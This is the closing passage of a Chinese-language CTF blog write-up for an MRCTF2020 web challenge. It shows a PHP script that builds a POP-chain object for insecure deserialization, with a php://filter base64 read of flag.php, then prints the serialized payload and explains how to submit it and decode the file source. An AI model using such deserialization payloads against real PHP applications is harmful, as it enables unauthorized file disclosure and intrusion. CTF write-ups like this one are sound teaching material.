+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $var = <span class="string">"php://filter/convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $source;</span><br><span class="line">	<span class="keyword">public</span> $str;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Welcome to "</span>. <span class="keyword">$this</span>-&gt;source. <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"bantttian"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $p;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> Show(<span class="string">'aaa'</span>);</span><br><span class="line">$o-&gt;str = <span class="keyword">new</span> Test();</span><br><span class="line">$bantian = <span class="keyword">new</span> Show($o);</span><br><span class="line"><span class="keyword">echo</span> serialize($bantian);</span><br></pre></td></tr></table></figure>
+
+<p>得到结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;s:3:&quot;aaa&quot;;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:6:&quot;*var&quot;;s:52:&quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;&#125;&#125;&#125;s:3:&quot;str&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进行<code>urlencode</code>操作，传入pop参数得到base64加密后的<code>flag.php</code>文件源码，base64解密就可得到flag。</p>
+<p>最近实在是有点忙，还有一半多的题目没有做，只能忙里偷闲找时间做了。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Bantian</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://bantttian.github.io/2020/03/31/[MRCTF2020]Web-WriteUp-1/">https://bantttian.github.io/2020/03/31/[MRCTF2020]Web-WriteUp-1/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>早睡早起身体好</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/Web/"># Web</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/04/02/Execution-After-Redirect%E6%BC%8F%E6%B4%9E-%E5%A4%9A%E7%A7%8D%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E5%AD%A6%E4%B9%A0/">Execution After Redirect漏洞+多种延时注入姿势学习</a>
+            
+            
+            <a class="next" rel="next" href="/2020/03/30/WWW2018-Large-Scale-Analysis-of-Style-Injection-by-Relative-Path-Overwrite/">WWW2018论文精读 Large-Scale Analysis of Style Injection by Relative Path Overwrite</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Bantian | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
